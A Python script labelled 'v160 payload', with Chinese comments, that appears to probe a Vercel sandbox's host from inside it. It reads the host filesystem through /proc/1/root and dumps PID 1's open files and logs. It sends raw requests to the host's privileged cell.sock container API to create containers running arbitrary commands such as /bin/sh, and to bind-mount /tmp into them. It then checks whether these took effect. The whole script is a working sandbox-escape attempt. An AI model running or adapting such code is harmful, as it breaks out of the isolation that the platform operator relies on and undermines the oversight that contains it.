# -*- coding: utf-8 -*-
"""v160 payload: runc create 失败诊断 (celld 日志/fd) + /run/cell 枚举 + command 格式测试
输出 /vercel/sandbox/v160c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v160c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=400):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def dump_fd(pid, tag):
    """读进程打开的 fd: symlink 目标 + 若为日志文件则读尾部"""
    try:
        for fd in sorted(os.listdir('/proc/%s/fd' % pid)):
            try:
                tgt = os.readlink('/proc/%s/fd/%s' % (pid, fd))
            except Exception:
                continue
            if tgt.startswith('/'):
                try:
                    st = os.stat('/proc/%s/fd/%s' % (pid, fd))
                    if stat_isfile(st) and st.st_size < 200000:
                        d = open('/proc/%s/fd/%s' % (pid, fd), 'rb').read()[-3000:]
                        if b'error' in d.lower() or b'fail' in d.lower() or b'runc' in d.lower():
                            log('%s fd%s -> %s (%d B) tail: %r' % (tag, fd, tgt, len(d), d[-1500:]))
                            continue
                except Exception:
                    pass
            log('%s fd%s -> %s' % (tag, fd, tgt))
    except Exception as e:
        log('fd EXC %s' % e)


def stat_isfile(st):
    import stat as s
    return s.S_ISREG(st.st_mode)


# ============ 1: /run/cell 完整枚举 ============
log('=== 1 /run/cell ===')
try:
    for e in sorted(os.listdir(R + '/run/cell')):
        p = R + '/run/cell/' + e
        try:
            st = os.lstat(p)
            log('cell %s type=%s' % (e, 'dir' if (st.st_mode & 0o170000) == 0o040000 else 'other'))
        except Exception as ex:
            log('cell %s ERR %s' % (e, ex))
except Exception as e:
    log('cell EXC %s' % e)
# 递归枚举 /run/cell 下两层
for sub in ['run', 'volumes', 'drives']:
    p = R + '/run/cell/' + sub
    if os.path.isdir(p):
        for e in sorted(os.listdir(p))[:30]:
            log('cell/%s %s' % (sub, e))

# ============ 2: celld fd 枚举 (找日志/socket) ============
log('=== 2 celld fds ===')
dump_fd(1, 'celld')

# ============ 3: Create 失败前后日志对比 ============
log('=== 3 create fail diag ===')
# 失败前记录日志长度
try:
    logfile = os.readlink('/proc/1/fd/2')
    log('celld stderr -> %s' % logfile)
except Exception:
    pass
# 触发失败
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': 'echo hi'}).encode(), t=8)
log('Create cmd=echo hi -> %s %r' % (st, pay[:300]))
time.sleep(0.5)
# 失败后读日志尾部
for fd in ['1', '2']:
    try:
        tgt = os.readlink('/proc/1/fd/%s' % fd)
        if tgt.startswith('/'):
            d = open('/proc/1/fd/%s' % fd, 'rb').read()
            log('post-fail fd%s %s len=%d tail=%r' % (fd, tgt, len(d), d[-2000:]))
    except Exception as e:
        log('post fd%s EXC %s' % (fd, e))
# runc state 目录
for p in ['/run/runc', '/run/cell/runc', '/run/containerd/io.containerd.runtime.v2.task']:
    try:
        for e in sorted(os.listdir(R + p))[:20]:
            log('post dir %s/%s' % (p, e))
    except Exception as e:
        log('post dir %s EXC %s' % (p, e))

# ============ 4: command 格式测试 ============
log('=== 4 cmd formats ===')
for cmd in ['sleep', 'sleep 300', '/bin/sleep 300', 'echo hi', '/bin/echo hi',
            '/bin/sh', 'sh -c echo hi']:
    st, pay = raw_req(CELL, '%s/Create' % CTRS,
                      json.dumps({'drive_id': 'sandbox', 'command': cmd}).encode(), t=8)
    log('Create cmd=%r -> %s %r' % (cmd, st, pay[:250]))
    if '200' in st:
        m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
        if m:
            cid = m.group(1).decode()
            log('  SUCCESS cid=%s' % cid)
            # 成功后检查进程
            time.sleep(1)
            for d in sorted(os.listdir('/proc')):
                if d.isdigit():
                    try:
                        comm = open('/proc/%s/comm' % d).read().strip()
                    except Exception:
                        continue
                    if comm in ('sleep', 'sh', 'runc', 'init'):
                        try:
                            cl = open('/proc/%s/cmdline' % d).read()[:100].replace('\x00', ' ')
                        except Exception:
                            cl = '?'
                        log('  proc %s comm=%s cmd=%s' % (d, comm, cl))
            # runc 目录
            try:
                for e in sorted(os.listdir(R + '/run/cell/runc')):
                    log('  runc dir %s' % e)
            except Exception:
                pass

# ============ 5: Mount 验证 (对无 command 容器) ============
log('=== 5 mount verify ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS, json.dumps({'drive_id': 'sandbox'}).encode(), t=8)
log('Create plain -> %s %r' % (st, pay[:250]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
if cid:
    mi0 = open('/proc/1/mountinfo').read()
    cnt0 = len(mi0.splitlines())
    st, pay = raw_req(CELL, '%s/Mount' % CTRS,
                      json.dumps({'container_id': cid, 'mounts': [{'bind': {'source': '/tmp', 'destination': '/mnt/x'}}]}).encode(), t=5)
    log('Mount bind -> %s %r' % (st, pay[:250]))
    time.sleep(0.5)
    mi1 = open('/proc/1/mountinfo').read()
    cnt1 = len(mi1.splitlines())
    log('mountinfo %d -> %d lines' % (cnt0, cnt1))
    for ln in mi1.splitlines():
        if 'mnt/x' in ln or 'bind' in ln.lower() or 'tmp' in ln.split()[4]:
            log('MI %s' % ln[:180])

log('V160_DONE')
f.close()
